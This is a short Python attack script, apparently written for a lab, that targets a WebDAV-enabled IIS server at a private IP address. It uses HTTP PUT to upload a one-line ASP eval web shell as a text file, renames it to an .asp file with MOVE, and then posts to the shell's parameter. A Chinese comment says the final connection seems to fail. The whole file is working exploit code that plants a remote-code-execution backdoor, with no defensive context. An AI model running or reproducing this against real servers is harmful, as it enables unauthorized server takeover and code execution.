#encoding="utf-8"
import requests

#分别需要put,move的url
put_url = 'http://192.168.111.139/2.txt'
move_url = 'http://192.168.111.139/2.txt'
move_headers = {
    'Destination':'http://192.168.111.139/shell9.asp'
}
#put的脚本
put_data = "<%eval request('apple')%>"
#最终的连接脚本,但似乎连接不成功
post_data = {
    'apple':''
}
try:
    response = requests.request('PUT',url=put_url,data=put_data)
    if response.status_code == 200:
        response = requests.request('MOVE',url=move_url,headers=move_headers)
        if response.status_code == 207:
            response = requests.post(url='http://192.168.111.139/shell9.asp',data=post_data)
            print(response.content.decode("gb2312"))
        else:
            print(response.status_code)
except:
    pass